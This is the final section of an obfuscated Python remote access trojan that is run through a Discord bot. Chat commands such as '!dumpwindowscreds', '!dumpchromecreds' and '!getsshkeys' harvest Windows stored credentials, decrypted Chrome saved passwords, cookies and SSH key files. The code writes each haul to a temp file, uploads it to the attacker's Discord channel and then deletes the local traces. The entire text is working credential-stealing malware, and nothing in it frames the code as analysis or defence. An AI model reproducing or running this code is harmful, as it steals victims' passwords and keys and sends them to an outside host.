            OO0OO0OO00000OO0O =discord .File (O0000O0OOO0OO0O00 ,filename ="cookies.txt")#line:860
            await O00OO0O000OO00O0O .channel .send ("[*] Command successfuly executed",file =OO0OO0OO00000OO0O )#line:861
            os .remove (O0000O0OOO0OO0O00 )#line:862
        if O00OO0O000OO00O0O .content =="!dumpwindowscreds":#line:863
            OOO0OOO0O00000O00 =win32cred .CredEnumerate #line:864
            O00000O0O0O0O0OO0 =win32cred .CredRead #line:865
            try :#line:866
                O0OOO00000O000O00 =OOO0OOO0O00000O00 (None ,0 )#line:867
            except Exception :#line:868
                pass #line:869
            OOO000O000OOOO000 =[]#line:870
            for OO0OOOO0O000O000O in O0OOO00000O000O00 :#line:871
                try :#line:872
                    O0OO0OO0O0OOOO0O0 =OO0OOOO0O000O000O ['TargetName']#line:873
                    O0OOO00000O000O00 =O00000O0O0O0O0OO0 (O0OO0OO0O0OOOO0O0 ,CRED_TYPE_GENERIC )#line:874
                    OOO000O000OOOO000 .append (O0OOO00000O000O00 )#line:875
                except pywintypes .error :#line:876
                    pass #line:877
            O0OO0OOO0OOO00OOO =io .StringIO ()#line:878
            for OO000OOOO0OO0O0OO in OOO000O000OOOO000 :#line:879
                O0OO0OO0OOOOOOO0O =OO000OOOO0OO0O0OO ['TargetName']#line:880
                O0OOOO00000O0OO00 =OO000OOOO0OO0O0OO ['UserName']#line:881
                try :#line:882
                    OOO0OO00OO000O00O =OO000OOOO0OO0O0OO ['CredentialBlob'].decode ('utf-16')#line:883
                except UnicodeDecodeError :#line:884
                    try :#line:885
                        OOO0OO00OO000O00O =OO000OOOO0OO0O0OO ['CredentialBlob'].decode ('utf-8')#line:886
                    except UnicodeDecodeError :#line:887
                        OOO0OO00OO000O00O =OO000OOOO0OO0O0OO ['CredentialBlob']#line:888
                O0OO0OOO0OOO00OOO .write ('Service: '+str (O0OO0OO0OOOOOOO0O )+'\n')#line:889
                O0OO0OOO0OOO00OOO .write ('Username: '+str (O0OOOO00000O0OO00 )+'\n')#line:890
                O0OO0OOO0OOO00OOO .write ('Password: '+str (OOO0OO00OO000O00O )+'\n')#line:891
                O0OO0OOO0OOO00OOO .write ('\n')#line:892
            O0OO000000OOOO0O0 =os .getenv ("TEMP")#line:893
            O0000O0OOO0OO0O00 =O0OO000000OOOO0O0 +r"\windows-creds.txt"#line:894
            with open (O0000O0OOO0OO0O00 ,'w')as O00OOOOO0OOOOOO0O :#line:895
                json .dump (O0OO0OOO0OOO00OOO .getvalue (),O00OOOOO0OOOOOO0O )#line:896
            OO0OO0OO00000OO0O =discord .File (O0000O0OOO0OO0O00 ,filename ="windows-creds.txt")#line:897
            await O00OO0O000OO00O0O .channel .send ("[*] Command successfuly executed",file =OO0OO0OO00000OO0O )#line:898
            os .remove (O0000O0OOO0OO0O00 )#line:899
        if O00OO0O000OO00O0O .content =="!dumpchromecreds":#line:900
            try :#line:901
                O0O0OOO00O0O0OOOO =os .environ ['localappdata']+'\\Google\\Chrome\\User Data\\Default\\Login Data'#line:902
                shutil .copy2 (O0O0OOO00O0O0OOOO ,'./Login Data')#line:903
                win32api .SetFileAttributes ('./Login Data',win32con .FILE_ATTRIBUTE_HIDDEN )#line:904
            except Exception :#line:905
                pass #line:906
            OOO0OOOO00O0000OO =io .StringIO ()#line:907
            try :#line:908
                OOO000OO00O00OOOO =sqlite3 .connect ('./Login Data',)#line:909
                OO00O0OO000O00OO0 =OOO000OO00O00OOOO .cursor ()#line:910
                OO00O0OO000O00OO0 .execute ('SELECT action_url, username_value, password_value FROM logins')#line:911
                O00000000OOOOOOOO =OO00O0OO000O00OO0 .fetchall ()#line:912
                OOO000OO00O00OOOO .close ()#line:913
                os .remove ('Login Data')#line:914
                for OOO00OOO0OOOO0OO0 ,OO0O00O0O0OOOO0O0 ,OO0000O00O0OOOO00 in O00000000OOOOOOOO :#line:915
                    print (OO0000O00O0OOOO00 )#line:916
                    OOO0OO00OO000O00O =win32crypt .CryptUnprotectData (OO0000O00O0OOOO00 ,None ,None ,None ,0 )[1 ]#line:917
                    if OOO0OO00OO000O00O :#line:918
                        OOO0OOOO00O0000OO .write ('URL: '+OOO00OOO0OOOO0OO0 +'\n')#line:919
                        OOO0OOOO00O0000OO .write ('Username: '+OO0O00O0O0OOOO0O0 +'\n')#line:920
                        OOO0OOOO00O0000OO .write ('Password: '+str (OOO0OO00OO000O00O )+'\n')#line:921
                        OOO0OOOO00O0000OO .write ('\n')#line:922
                O0OO000000OOOO0O0 =os .getenv ("TEMP")#line:923
                O0000O0OOO0OO0O00 =O0OO000000OOOO0O0 +r"\chrome-creds.txt"#line:924
                with open (O0000O0OOO0OO0O00 ,'w')as O00OOOOO0OOOOOO0O :#line:925
                    json .dump (OOO0OOOO00O0000OO .getvalue (),O00OOOOO0OOOOOO0O )#line:926
                OO0OO0OO00000OO0O =discord .File (O0000O0OOO0OO0O00 ,filename ="chrome-creds.txt")#line:927
                await O00OO0O000OO00O0O .channel .send ("[*] Command successfuly executed",file =OO0OO0OO00000OO0O )#line:928
                os .remove (O0000O0OOO0OO0O00 )#line:929
            except sqlite3 .OperationalError as OO0O00O0O0O0O0O00 :#line:930
                print (OO0O00O0O0O0O0O00 )#line:931
                pass #line:932
            except Exception as OO0O00O0O0O0O0O00 :#line:933
                print (OO0O00O0O0O0O0O00 )#line:934
                pass #line:935
        if O00OO0O000OO00O0O .content =="!getsshkeys":#line:936
            O0OOO0O00OO0OO0O0 =''#line:937
            O0000O000000O0O0O ="~/.ssh/"#line:938
            O0OO000000OOOO0O0 =os .getenv ("TEMP")#line:939
            O00OOOOO0O000O00O =os .scandir (os .path .expanduser (O0000O000000O0O0O ))#line:940
            if (O00OOOOO0O000O00O ):#line:941
                for O00O000OOO0O0OO0O in O00OOOOO0O000O00O :#line:942
                    if O00O000OOO0O0OO0O .is_file ():#line:943
                        with open (O00O000OOO0O0OO0O ,'r')as O000OOOOOOO0O0000 :#line:944
                            O0OOO0O00OO0OO0O0 +=' '+O000OOOOOOO0O0000 .read ().rstrip ()#line:945
                O0000O0OOO0OO0O00 =O0OO000000OOOO0O0 +r"\ssh-keys.txt"#line:946
                with open (O0000O0OOO0OO0O00 ,'w')as O00OOOOO0OOOOOO0O :#line:947
                    json .dump (O0OOO0O00OO0OO0O0 ,O00OOOOO0OOOOOO0O )#line:948
                OO0OO0OO00000OO0O =discord .File (O0000O0OOO0OO0O00 ,filename ="chrome-creds.txt")#line:949
                await O00OO0O000OO00O0O .channel .send ("[*] Command successfuly executed",file =OO0OO0OO00000OO0O )#line:950
                os .remove (O0000O0OOO0OO0O00 )#line:951
            else :#line:952
                await O00OO0O000OO00O0O .channel .send ("No SSH keys found")#line:953
client .run (token )